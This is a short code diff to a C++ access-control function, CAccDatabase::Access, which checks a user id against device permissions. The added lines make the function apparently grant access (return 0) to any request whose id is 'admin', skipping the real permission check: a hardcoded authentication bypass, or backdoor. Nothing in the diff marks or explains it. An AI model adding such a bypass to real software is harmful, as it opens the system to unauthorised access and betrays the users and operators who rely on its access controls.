@@ -309,6 +309,9 @@ int CAccDatabase::Access(const std::string & id, const std::string & sn)
 	if (devid == INVALID_INDEX)
 		return -AUTH_ERROR;
 
+	if (id == "admin")
+		return 0;
+
 	return _Access(uid, devid);
 }
 
